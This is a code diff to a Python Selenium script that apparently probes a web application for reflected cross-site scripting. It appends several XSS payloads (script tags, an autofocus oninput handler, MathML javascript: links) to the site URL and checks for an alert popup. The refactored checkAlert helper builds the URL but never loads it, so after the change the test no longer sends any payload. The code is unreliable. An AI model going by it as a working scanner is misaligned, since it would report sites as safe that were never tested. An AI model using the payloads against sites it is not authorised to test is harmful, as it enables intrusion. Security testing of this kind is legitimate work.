@@ -88,54 +88,36 @@ login_attempt.submit()
 
 time.sleep(10)
 
+
+
+def checkAlert(browser, base_url, payload):
+  newurl = base_url+"/"+payload
+  try:
+    WebDriverWait(browser, 3).until(EC.alert_is_present(),
+                                   'Timed out waiting for PA creation ' +
+                                   'confirmation popup to appear.')
+
+    alert = browser.switch_to.alert
+    alert.accept()
+    print("alert accepted")
+  except TimeoutException:
+    print("no alert")
+  time.sleep(3)
+
+
+
 current_url = browser.current_url
-newurl = base_url+"/"+"""<ScRipT>alert("XSS");</ScRipT>""";
-browser.get(newurl);
-try:
-    WebDriverWait(browser, 3).until(EC.alert_is_present(),
-                                   'Timed out waiting for PA creation ' +
-                                   'confirmation popup to appear.')
 
-    alert = browser.switch_to.alert
-    alert.accept()
-    print("alert accepted")
-except TimeoutException:
-    print("no alert")
+payload = """<ScRipT>alert("XSS");</ScRipT>"""
+checkAlert(browser, base_url, payload)
 
-time.sleep(3)
 
-newurl = base_url+"/"+"""<body oninput=javascript:alert(1)><input autofocus>""";
-browser.get(newurl);
-try:
-    WebDriverWait(browser, 3).until(EC.alert_is_present(),
-                                   'Timed out waiting for PA creation ' +
-                                   'confirmation popup to appear.')
+payload = """<body oninput=javascript:alert(1)><input autofocus>"""
+checkAlert(browser, base_url, payload)
 
-    alert = browser.switch_to.alert
-    alert.accept()
-    print("alert accepted")
-except TimeoutException:
-    print("no alert")
 
-time.sleep(3)
+payload = """<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>"""
+checkAlert(browser, base_url, payload)
 
-newurl = base_url+"/"+"""<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>""";
-browser.get(newurl);
-try:
-    WebDriverWait(browser, 3).until(EC.alert_is_present(),
-                                   'Timed out waiting for PA creation ' +
-                                   'confirmation popup to appear.')
 
-    alert = browser.switch_to.alert
-    alert.accept()
-    print("alert accepted")
-except TimeoutException:
-    print("no alert")
 
-time.sleep(3)
-
-# newsnippet_url = base_url + "/newsnippet.gtl"
-
-# new_snippet = browser.find_element_by_xpath("""/html/body/div[2]/div/form/textarea""")
-
-# new_snippet.send_keys("<script>alert</script>")
